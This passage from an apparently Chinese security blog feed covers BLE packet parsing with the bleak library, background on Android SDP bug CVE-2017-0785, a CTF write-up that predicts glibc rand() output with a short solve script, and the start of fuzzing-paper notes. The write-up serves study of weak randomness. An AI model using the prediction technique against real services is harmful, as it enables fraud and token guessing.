也都没有出现前导码<br>个人猜测是与我们使用nrf connect发包有关系 这个疑问得到后续的使用项目发包再来解决<br>访问地址用来指明A和B设备之间进行传输<br>但是你可以发现很多包的访问地址都是一样的 0x8e89bed6<br>此为广告物理通道数据包固定的访问地址<br>广告物理通道PDU仍然走的是物理通道 但是其是用于广播 扫描 发起连接<br>广告物理通道的PDU拥有16bit的标头<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311301159234.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311301159234.png" alt="image.png"></a><br>其拆分成各部分如上图所示<br>我们抓包得到的两个字节为 0xc30c<br>0x0c是length这部分 那么0xc3就是前面的五个部分<br>将其拆分成二进制可以得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 1 0 0 0011</span><br></pre></td></tr></table></figure><p>观察wireshark解析出来的各个部分 和我们自己解析的不一样<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311301210463.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311301210463.png" alt="image.png"></a><br>联想到前面的访问地址在数据包中的形式 所以这里应该是采用了小端序存储<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311301211842.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311301211842.png" alt="image.png"></a><br>PDU TYPE 为0011 应对者SCAN_REQ 并且格式为LE 1M<br>接下来 显然红框的部分就是payload<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311301217368.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311301217368.png" alt="image.png"></a><br>一共是12字节 也印证了前面标头中的length没错<br>payload的内容定义了扫描设备的MAC地址以及广播设备的MAC地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311301218695.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311301218695.png" alt="image.png"></a><br>后面的三字节 即为crc校验码 用来确保数据传输过程中的完整性</p><h1 id="bleak库的使用"><a href="#bleak库的使用" class="headerlink" title="bleak库的使用"></a>bleak库的使用</h1><p>接下来尝试使用python的bleak库来和蓝牙设备进行通讯 此举为了便于我们后面阅读蓝牙安全相关的论文或者是复现cve漏洞 <a href="https://github.com/hbldh/bleak">https://github.com/hbldh/bleak</a><br>以下代码示例如非特殊说明 均在windows11平台下进行<br>同时 官方的代码示例中 会使用asyncio库进行异步编程 由于我的开发能力几乎没有 所以会借助这次机会 了解了解 下文中会偶尔穿插一些异步编程的理解<br>安装库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install bleak</span><br></pre></td></tr></table></figure><h2 id="基础通讯实现"><a href="#基础通讯实现" class="headerlink" title="基础通讯实现"></a>基础通讯实现</h2><h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><p>先来尝试扫描可连接的蓝牙设备</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import asyncio</span><br><span class="line">from bleak import BleakScanner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">async def main():</span><br><span class="line">    devices = await BleakScanner.discover()</span><br><span class="line">    for d in devices:</span><br><span class="line">        print(d)</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure><p>可以看到扫描到了一些设备<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311302000354.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311302000354.png" alt="image.png"></a><br>前面的是设备的MAC地址 后面的是名称 虽然我们前面提到 设备的设备地址是唯一的<br>其中设备地址有两种形式 公共设备地址以及随机设备地址<br>公共设备地址是需要向IEEE申请的 同时需要花钱 但具有唯一性<br>而随机设备地址在设备启动后随机生成<br>在现如今不断增加的蓝牙设备 尤其是大量的BLE设备 显然前者的弊端是比较大的 所以大多数采用的是随机设备地址<br>这里以上图中的蓝牙键盘 Kzzi-K75为例 在第一次扫描的过程中 其MAC地址为DD:BB:CF:F4:BD:D9<br>接下来我们关闭该设备 随后再次打开 再次扫描一下试试<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311302011543.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311302011543.png" alt="image.png"></a><br>可以发现此时变更为了F1:4E:33:18:EC:D5<br>接下来我们尝试使用python脚本来实现和上面用nrf connect工具获取设备名称的操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">async def get_devideinfo(address):</span><br><span class="line">    async with BleakClient(address) as client:</span><br><span class="line">        print(&quot;成功连接到蓝牙设备&quot;)</span><br><span class="line">        services = client.services</span><br><span class="line">        for s in services:</span><br><span class="line">            print(&quot;服务uuid:&quot;,s.uuid)</span><br><span class="line">            for c in s.characteristics:</span><br><span class="line">                print(c)</span><br></pre></td></tr></table></figure><p>这里使用BleakClient构造函数 以address为参数  创建了一个client对象<br>client此时是一个客户端实例 可以将其理解为一个主设备 用于连接其他设备 以及发起通讯<br>通过上述代码 我们可以获取到address对应的设备的服务及其特征<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311302308336.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311302308336.png" alt="image.png"></a><br>还可以通过输出c.properties来查看特征值的权限<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311302316448.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311302316448.png" alt="image.png"></a></p><h3 id="读取和写入"><a href="#读取和写入" class="headerlink" title="读取和写入"></a>读取和写入</h3><p>接下来 我们将对特征值动手 学习使用write_gatt_char()和read_gatt_char()两个方法<br>我们前面提到过ATT层的核心就是属性<br>属性由 句柄 类型 值 权限这四个部分组成<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202312041053545.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202312041053545.png" alt="image.png"></a><br>句柄是一个2字节的十六进制码 在系统初始化时为0x0001 逐步增加1 最高到0xffff<br>可以把其看作一个指向属性的指针 通过句柄可以访问到对应的属性<br>类型是用来区分当前属性是服务还是特征 具体的表现形式是uuid<br>Ble的属性类型一共有四大类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Primary Service（首要服务项）</span><br><span class="line">Secondary Service（次要服务项）</span><br><span class="line">Include（包含服务项）</span><br><span class="line">Characteristic（特征值）</span><br></pre></td></tr></table></figure><p>uuid中的第三和第四字节对于属性类型进行了标注<br>以下列这个uuid为例 00002a00-0000-1000-8000-00805f9b34fb<br>其第三第四字节为0x2a00<br>根据下列表格判断得到 为特征值类型</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x1800 – 0x26FF ：服务项类型</span><br><span class="line">0x2700 – 0x27FF ：单位</span><br><span class="line">0x2800 – 0x28FF ：属性类型</span><br><span class="line">0x2900 – 0x29FF ：描述符类型</span><br><span class="line">0x2A00 – 0x7FFF ：特征值类型</span><br></pre></td></tr></table></figure><p>值则用来存放属性的内容 其需要一定的内存空间 操控属性值就是对这块内容空间进行更改<br>属性权限包括四种 访问权限 加密权限 认证权限 授权权限<br>了解了这些前置知识 再来观摩观摩官方给出的几个bleak库例子代码<br><a href="https://github.com/hbldh/bleak/blob/develop/examples/sensortag.py">https://github.com/hbldh/bleak/blob/develop/examples/sensortag.py</a><br>来看68行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uuid16_lookup = &#123;v: normalize_uuid_16(k) for k, v in uuid16_dict.items()&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="CVE-2017-0785"><a href="#CVE-2017-0785" class="headerlink" title="CVE-2017-0785"></a>CVE-2017-0785</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>该漏洞的核心在于BlueDroid和Fluoride这两个适用于安卓操作系统的蓝牙协议栈<br>总体的理解难度比较大 包含了比较多的新知识</p><h3 id="背景普及"><a href="#背景普及" class="headerlink" title="背景普及"></a>背景普及</h3><p>我们上文中仅对于低功耗蓝牙协议栈进行了普及 但是我们本次复现的漏洞是关于经典蓝牙的 所以这里先对于漏洞的发生层SDP 进行一些简单的介绍以及了解经典蓝牙的协议栈<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202312111650536.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202312111650536.png" alt="image.png"></a><br>上图中 红色部分是经典蓝牙协议栈独有的 绿色部分是低功耗蓝牙所独有的 蓝色部分为公共部分<br>但是经典蓝牙也可以拥有部分绿色的特性<br>SDP层为服务发现协议(SERVICE DISCOVERY PROTOCOL) 为应用程序提供方法发现哪些服务可用 并确认这些服务的特征<br>你是否还记得前面学习的抓包 我们抓取的是利用nrf connect for moblie来向ble设备发包<br>通过wireshark抓取到的就是一个request pdu和一个response pdu<br>sdp也是同理 其实际上就是定义一个client如何找到server提供的服务<br>client先向server发送一个request pdu 等待server相应后返回response pdu<br>来观察一下两种pdu的构造</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Bluetooth SDP Protocol</span><br><span class="line">        PDU: Service Search Attribute Request (0x06)</span><br><span class="line">        Transaction Id: 0x0000</span><br><span class="line">        Parameter Length: 15</span><br><span class="line">        Service Search Pattern: Public Browse Group</span><br><span class="line">        Maximum Attribute Byte Count: 65535</span><br><span class="line">        Attribute ID List</span><br><span class="line">        Continuation State: no (00)</span><br></pre></td></tr></table></figure><p>先是request pdu  有两个比较重要的参数Maximum Attribute Byte Count和Continuation State<br>前者用于限制response pdu返回的数据大小<br>比如这里为65535 即不得超过对应字节 来结合下面这个response pdu</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Bluetooth SDP Protocol</span><br><span class="line">        PDU: Service Search Attribute Response (0x07)</span><br><span class="line">        Transaction Id: 0x0000</span><br><span class="line">        Parameter Length: 667</span><br><span class="line">        Attribute List Byte Count: 662</span><br><span class="line">        Data Fragment</span><br><span class="line">        Continuation State: yes (02 96)</span><br><span class="line">            Continuation State Length: 2</span><br><span class="line">            Continuation State Value</span><br></pre></td></tr></table></figure><p>Attribute List Byte Count标识了response pdu包含的数据大小 为662<br>Attribute List Byte Count的大小不得超过Maximum Attribute Byte Count所定义的<br>如果超过了 就会对response pdu进行分段 随后利用Continuation State进行传输<br>这里的分段大小是由server自己决定的 比如上述的两个pdu Attribute List Byte Count就是662 并没有将Maximum Attribute Byte Count全部分割<br>目前手头还没有设备能够抓取sdp层的包 所以这里先使用其他文章中的包来分析<br>Continuation State包含两个部分 InfoLength和Continuation Information<br>前者用来标识后者的长度 最大值为0x10<br>后者通过response pdu发回给client 随后client会将其放到下一个request pdu中 发送给server 从而再作出分段的决策 以此来往复<br>但是在实际的过程中 造成分段的并不只有上述这一个原因<br>L2CAP的Maximum Transmission Unit参数仍然会限制数据大小 从而造成分段</p><h3 id="SDP层详解"><a href="#SDP层详解" class="headerlink" title="SDP层详解"></a>SDP层详解</h3><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>需要进一步了解Continuation Information在Android中是如何定义的 就需要我们来阅读源码<br><a href="https://android.googlesource.com/platform/system/bt/+/refs/tags/android-8.0.0_r1/stack/sdp/sdpint.h">https://android.googlesource.com/platform/system/bt/+/refs/tags/android-8.0.0_r1/stack/sdp/sdpint.h</a> 中的第200行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    #if (SDP_SERVER_ENABLED == TRUE)</span><br><span class="line">  uint16_t cont_offset;     /* Continuation state data in the server response */</span><br><span class="line">  tSDP_CONT_INFO cont_info; /* structure to hold continuation information for</span><br><span class="line">                               the server response */</span><br><span class="line">#endif                      /* SDP_SERVER_ENABLED == TRUE */</span><br><span class="line">&#125; tCONN_CB;</span><br></pre></td></tr></table></figure><p>其中的 cont_offset起到了关键的作用 从注释中可以得知 其是用来指示客户端在请求继续传输时 从响应数据的哪个位置开始获取后续的数据<br>也就是我们上文说到的数据分段的时候 其负责给server索引分段的数据<br>根据pdu的不同 可以分为两种情况<br>第一类情形是使用SDP_SERVICE_SEARCH_REQ&#x2F;RSP PDU时 即服务搜索请求和服务搜索响应<br>此时的数据单位称之为数据项 如果上一个pdu已经传输了20数据项 那么cont_offset的值就是20<br>第二类情形是使用SDP_SERVICE_ATTR_REQ&#x2F;RSP 或 SDP_SERVICE_SEARCH_ATTR_REQ&#x2F;RSP 时 即服务属性请求&#x2F;响应 服务属性搜索请求&#x2F;响应<br>区别于前者 数据的单位由数据项变成了字节 其代表的是已经传输的数据总和  比如如果为662 说明前面传输的分段数据大小为662字节<br>总是纸上谈兵可不能理解清楚 我们来尝试利用wireshark抓一个sdp包来看看</p><h3 id="抓取sdp包"><a href="#抓取sdp包" class="headerlink" title="抓取sdp包"></a>抓取sdp包</h3></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>伪随机数推算</title>
    <link href="http://example.com/2023/10/30/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%8E%A8%E7%AE%97/"/>
    <id>http://example.com/2023/10/30/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%8E%A8%E7%AE%97/</id>
    <published>2023-10-30T12:42:05.000Z</published>
    <updated>2023-11-04T02:09:44.907Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以往遇到的考察伪随机数的题目都相对比较简单 无非就是通过seed来推算出后续的随机数 但是这次的核心在于 seed不可控且不可知的情况下 如何通过seed生成的伪随机数 来推算出后续的随机数</p><h1 id="rand函数源码分析"><a href="#rand函数源码分析" class="headerlink" title="rand函数源码分析"></a>rand函数源码分析</h1><p>先来弄懂 rand函数究竟是如何通过seed来生成随机数的<br>以下代码均从 <a href="https://codebrowser.dev/glibc/">https://codebrowser.dev/glibc/</a> 摘录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Return a random integer between 0 and RAND_MAX.  */</span><br><span class="line">int</span><br><span class="line">rand (void)</span><br><span class="line">&#123;</span><br><span class="line">  return (int) __random ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内部进而调用了__random函数 跟进一下看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__random (void)</span><br><span class="line">&#123;</span><br><span class="line">  int32_t retval;</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  (void) __random_r (buf: &amp;unsafe_state, result: &amp;retval);</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  return retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点关注一下__random_r函数 unsafe_state结构体作为参数传输 返回值存储于retval</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static struct random_data unsafe_state =</span><br><span class="line">&#123;</span><br><span class="line">    /* FPTR和RPTR是指向状态信息的两个指针，一个前指针和一个后指针。</span><br><span class="line">       这两个指针始终相隔rand_sep个位置，因为它们在状态信息中循环。</span><br><span class="line">       （是的，这意味着我们可以只用一个指针，但是这种方式的random代码更高效）。</span><br><span class="line">       这两个指针的位置是从调用initstate(1, randtbl, 128)的位置开始：</span><br><span class="line">       （后指针rptr的位置实际上是0（如上面在初始化randtbl时解释的那样），</span><br><span class="line">       因为状态表指针被设置为指向randtbl[1]（如下面解释的那样）。）*/</span><br><span class="line"></span><br><span class="line">    .fptr = &amp;randtbl[SEP_3 + 1],    // SEP_3 = 3</span><br><span class="line">    .rptr = &amp;randtbl[1],</span><br><span class="line"></span><br><span class="line">    /* 以下内容是指向状态信息表的指针、当前生成器的类型、当前多项式的度数和两个指针之间的间隔。</span><br><span class="line">       注意，为了random的效率，我们记住状态信息的第一个位置，而不是第零个位置。</span><br><span class="line">       因此，访问state[-1]是有效的，它用于存储R.N.G.的类型。</span><br><span class="line">       另外，我们记住最后一个位置，因为这比每次索引以查找最后一个元素的地址来判断前后指针是否已经回绕更高效。 */</span><br><span class="line"></span><br><span class="line">    .state = &amp;randtbl[1],</span><br><span class="line"></span><br><span class="line">    .rand_type = TYPE_3,    // 3</span><br><span class="line">    .rand_deg = DEG_3,      // 3</span><br><span class="line">    .rand_sep = SEP_3,      // 3</span><br><span class="line"></span><br><span class="line">    .end_ptr = &amp;randtbl[sizeof(randtbl) / sizeof(randtbl[0])]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>根据注释可以得到 fptr和rptr是指向状态信息的前后指针 并且虽然rptr的起始是randtbl[1]但是实际上是0<br>为了理解这一描述 我们先来看一下randtbl数组的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static int32_t randtbl[DEG_3 + 1] =</span><br><span class="line">&#123;</span><br><span class="line">    TYPE_3,</span><br><span class="line"></span><br><span class="line">    -1726662223, 379960547, 1735697613, 1040273694, 1313901226,</span><br><span class="line">    1627687941, -179304937, -2073333483, 1780058412, -1989503057,</span><br><span class="line">    -615974602, 344556628, 939512070, -1249116260, 1507946756,</span><br><span class="line">    -812545463, 154635395, 1388815473, -1926676823, 525320961,</span><br><span class="line">    -1009028674, 968117788, -123449607, 1284210865, 435012392,</span><br><span class="line">    -2017506339, -911064859, -370259173, 1132637927, 1398500161,</span><br><span class="line">    -205601318</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该数组存储着内部状态信息 用于随机数的生成<br>通过randtbl数组的注释 我们可以得知上文中 后指针的位置为0的原因</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Initially, everything is set up as if from: ↪</span><br><span class="line">    initstate(1, randtbl, 128); ↪</span><br><span class="line">   Note that this initialization takes advantage of the fact that srandom ↪</span><br><span class="line">   advances the front and rear pointers 10*rand_deg times, and hence the ↪</span><br><span class="line">   rear pointer which starts at 0 will also end up at zero; thus the zeroth ↪</span><br><span class="line">   element of the state information, which contains info about the current ↪</span><br><span class="line">   position of the rear pointer is just ↪</span><br><span class="line">    (MAX_TYPES * (rptr - state)) + TYPE_3 == TYPE_3.</span><br></pre></td></tr></table></figure><p>后指针在初始化的时候指向第一个元素 所以第一个元素存储的是后指针当前位置的信息<br>接着我们回到unsafe_state结构体<br>其还定义了其他成员 用来记录生成器类型 随机次数 随机间隔<br>此外还记录了最后一个元素的位置<br>接下来分析一下__random_r函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __random_r(struct random_data *buf, int32_t *result)</span><br><span class="line">&#123;</span><br><span class="line">    int32_t *state;</span><br><span class="line"></span><br><span class="line">    if (buf == NULL || result == NULL)</span><br><span class="line">        goto fail;</span><br><span class="line"></span><br><span class="line">    state = buf-&gt;state;</span><br><span class="line"></span><br><span class="line">    if (buf-&gt;rand_type == TYPE_0)</span><br><span class="line">    &#123;</span><br><span class="line">        int32_t val = ((state[0] * 1103515245U) + 12345U) &amp; 0x7fffffff;</span><br><span class="line">        state[0] = val;</span><br><span class="line">        *result = val;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        int32_t *fptr = buf-&gt;fptr;</span><br><span class="line">        int32_t *rptr = buf-&gt;rptr;</span><br><span class="line">        int32_t *end_ptr = buf-&gt;end_ptr;</span><br><span class="line">        uint32_t val;</span><br><span class="line"></span><br><span class="line">        val = *fptr += (uint32_t)*rptr;</span><br><span class="line">        /* Chucking least random bit. */</span><br><span class="line">        *result = val &gt;&gt; 1;</span><br><span class="line">        ++fptr;</span><br><span class="line">        if (fptr &gt;= end_ptr)</span><br><span class="line">        &#123;</span><br><span class="line">            fptr = state;</span><br><span class="line">            ++rptr;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            ++rptr;</span><br><span class="line">            if (rptr &gt;= end_ptr)</span><br><span class="line">                rptr = state;</span><br><span class="line">        &#125;</span><br><span class="line">        buf-&gt;fptr = fptr;</span><br><span class="line">        buf-&gt;rptr = rptr;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">    __set_errno(EINVAL);</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考注释可以得知 生成器有两种类型 TYPE_0是使用旧的线性同余法  另外一个则是使用精巧三项式算法<br>先来看较为简单的前者 state[0]指向randtbl数组的第二个元素 将其乘以1103515245 U代表无符号整数 随后加上12345 最后进行与运算<br>这里清空了符号位 并且只保留低31位<br>随后更新state[0]以及result</p><p>接下来看后者<br>开始先将结构体的成员赋值给对应的局部变量(下面 前指针和后指针所指向的数值 为了方便描述 均采用缩写为前后指针<br>接着将后指针加上前指针 其和重新赋值给了前指针以及val变量<br>随后的注释比较耐人寻味 其说舍弃最不随机的位<br>下一条指令对val右移了一位 相当于val除2 结果取整<br>这里说的最不随机的位指的是最低1位<br>就拿线性同余运算举例<br>其运算式为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">val = ((state[0] * 1103515245U) + 12345U) &amp; 0x7fffffff</span><br></pre></td></tr></table></figure><p>这里使用state[0]默认的值379960547代入<br>可以编写这样一个测试程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int32_t state = 379960547;</span><br><span class="line">    int32_t val =0;</span><br><span class="line">    int time=1;</span><br><span class="line">    int bit =0;</span><br><span class="line">    for(int i=0;i&lt;20;i++)&#123;</span><br><span class="line">        val = ((state * 1103515245U) + 12345U) &amp; 0x7fffffff;</span><br><span class="line">        bit = val&amp;1;</span><br><span class="line">        state = val;</span><br><span class="line">        printf(&quot;count :%d ,val :%d,last bit: %d\n&quot;,time,val,bit);</span><br><span class="line">        time ++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后得到的结果为<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310312226443.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310312226443.png" alt="image.png"></a><br>可以看到最后一个bit为0和1交替 呈现出一定规律 所以称之为最不随机的位<br>说回正文 在进行了右移运算后 自增了前指针<br>如果前指针超过了数组的最后一个元素 那么就重置前指针 使其重新指向randtbl数组的第二个元素<br>如果没有超过 再自增后指针 如果后指针超过 那么就重置后指针 同上</p><h1 id="如何预测随机数"><a href="#如何预测随机数" class="headerlink" title="如何预测随机数"></a>如何预测随机数</h1><p>经过上面的源码分析<br>可以大概清楚随机数的生成逻辑<br>state数组从randtbl数组的第二个元素开始 也就是说state一共有31个元素<br>前指针初始指向s[3] (这里将state数组缩写成s)<br>后指针初始指向s[0]<br>那么我们这里就可以得到随机数数组o的第一个元素为<br>o[0] &#x3D; (s[3]+s[0])&gt;&gt;1<br>随后前指针和后指针均自增<br>随着推移 前指针会率先来到s数组的最后一个元素s[30]<br>根据源码推断 超过了s[30]后 就会重新赋值成s[0]<br>但是这里要注意 在随机数生成后 后指针与前指针之和会赋值给前指针<br>所以我们这里的s[?]只是一个代号 而非具体的值<br>也就是o[28] &#x3D; (s[0]+s[28])&gt;&gt;1<br>同理 o[31] &#x3D; (s[3]+s[0])&gt;&gt;1<br>如果拆分开成 s[3]&#x3D;s[3]+s[0],s[0] &#x3D; s[0]+s[28]<br>o[31]的值就有两种可能性<br>第一种为o[31] &#x3D; o[0]+o[28]<br>第二种为o[31] &#x3D; o[0]+o[28]+1<br>见下面表格</p><table><thead><tr><th>s[0]</th><th>s[3]</th><th>s[28]</th><th>o[31]</th></tr></thead><tbody><tr><td>奇</td><td>奇</td><td>奇</td><td>1</td></tr><tr><td>奇</td><td>奇</td><td>偶</td><td>1</td></tr><tr><td>奇</td><td>偶</td><td>奇</td><td>1</td></tr><tr><td>偶</td><td>奇</td><td>奇</td><td>2</td></tr><tr><td>奇</td><td>偶</td><td>偶</td><td>2</td></tr><tr><td>偶</td><td>偶</td><td>奇</td><td>1</td></tr><tr><td>偶</td><td>偶</td><td>偶</td><td>1</td></tr></tbody></table><p>可以看出是第一种可能性的概率为七分之五<br>也就是说 如果我们得到了o[0]和o[28] 我们就有比较大的概率预测出o[31]<br>同理 可以继续往下推  o[1]和o[29] 可得出o[32]等等<br>o[n] &#x3D; o[n-31]+o[n-3]或o[n] &#x3D; o[n-31]+o[n-3]+1<br>由于本人数学水平不高 所以无法想出怎么百分百预测 感兴趣的可以自己尝试(顺顺教教我</p><h1 id="实际演示"><a href="#实际演示" class="headerlink" title="实际演示"></a>实际演示</h1><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311041006599.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311041006599.png" alt="image.png"></a><br>以上面这题来举例 seed无法得知也无法覆盖<br>一共有101次机会<br>在猜数错误后 会提供正确的随机数<br>所以我们只需要保留o[0]和o[28]<br>就可以得出第32个随机数o[31]</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">o = []</span><br><span class="line">buf = 0</span><br><span class="line">for i in range(31):</span><br><span class="line">    io.recvuntil(&quot;Knowledge is power, not luck.\n&quot;)</span><br><span class="line">    io.sendline(b&#x27;0&#x27;)</span><br><span class="line">    io.recvuntil(&#x27;Here is some knowledge to help you become powerful...: &#x27;)</span><br><span class="line">    c = int(io.recvuntil(&quot;\n&quot;,drop = True))</span><br><span class="line">    o.append(c)</span><br><span class="line">buf = o[0]+o[28]</span><br><span class="line">print(buf)</span><br><span class="line">io.recvuntil(&quot;Knowledge is power, not luck.\n&quot;)</span><br><span class="line">io.sendline(str(buf))</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311041009081.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311041009081.png" alt="image.png"></a><br>成功得到正确的数值</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>Fuzzing: Art, Science, and Engineering论文阅读</title>
    <link href="http://example.com/2023/10/17/fuzzing-art-science-and-engineering%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    <id>http://example.com/2023/10/17/fuzzing-art-science-and-engineering%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</id>
    <published>2023-10-17T09:13:39.000Z</published>
    <updated>2023-10-22T14:07:14.049Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>原论文地址:<a href="https://arxiv.org/pdf/1812.00140.pdf">https://arxiv.org/pdf/1812.00140.pdf</a><br>由于本人的英文水平实在是太垃圾了 所以用的是谷歌机翻看的<br>部分语句可能由于机翻带来的影响导致语义错误</p><h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>模糊测试是一种概念简单 部署门槛低 且成效显著的漏洞发现技术<br>本文的目的旨在帮助保存大量的模糊测试样例以及保证其连贯性 提出一个统一的通用模型</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>作者简单介绍了fuzz是什么 以及此前其存在的缺陷 同时举了几个比赛队伍或者厂商使用FUZZ的案例  随后简要概括了fuzz社区的规模<br>因为fuzz的逐渐发展 导致了各种fuzz工具之间的术语存在明显的“歧义”(fragmentation)<br>作者认为 这种歧义很有可能会阻碍fuzz的传播  影响到fuzz的发展<br>所以 其认为有必要巩固和提炼模糊测试的进展 </p><h1 id="SYSTEMIZATION-TAXONOMY-AND-TEST-PRO-GRAMS"><a href="#SYSTEMIZATION-TAXONOMY-AND-TEST-PRO-GRAMS" class="headerlink" title="SYSTEMIZATION, TAXONOMY, AND TEST 